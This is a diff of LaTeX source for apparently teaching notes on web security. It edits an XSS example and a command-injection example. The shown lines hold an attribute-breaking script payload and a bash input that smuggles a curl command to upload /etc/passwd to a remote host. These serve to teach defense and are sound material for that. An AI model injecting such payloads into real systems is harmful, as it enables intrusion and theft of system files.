@@ -35,9 +35,10 @@ This happened because you didn't properly encoded the output such that it escape
 \subsection{Common XSS}
 Often values are printed as URIs or attributes:
 \begin{itemize}
-    \item e.g., \mintinline{html}{<a href=”http://example.com/user/%s”>}
-    \item The simplest XSS exploit is to pass a “ and wreck that tag like \mintinline{html}{name=”><script>alert(“xss”);</script><}
-    \item For provide the color for your username like \mintinline{html}{color=FFFFFF}
+    \item e.g., \mintinline{html}{<a href="http://example.com/user/%s">}
+    \item The simplest XSS exploit is to pass a " and wreck that tag like \mintinline{html}{name="><script>alert("xss");</script><...} %>
+      
+    \item For provide the color for your username like \mintinline{html}{color=FFFFFF} and add the exploit right after it.
 \end{itemize}
 
 \subsection{Solution}
@@ -161,7 +162,9 @@ Imagine you have a code segment like this?
 os.system("command arg1 arg2 %s", arg3)
 \end{minted}
 \end{listing}
+
 and a user supply this
+
 \begin{listing}[!h]
 \begin{minted}[linenos,numbersep=5pt,frame=lines,framesep=2mm, breaklines]{bash}
 ; curl -X PUT http://mysite -d @/etc/passwd
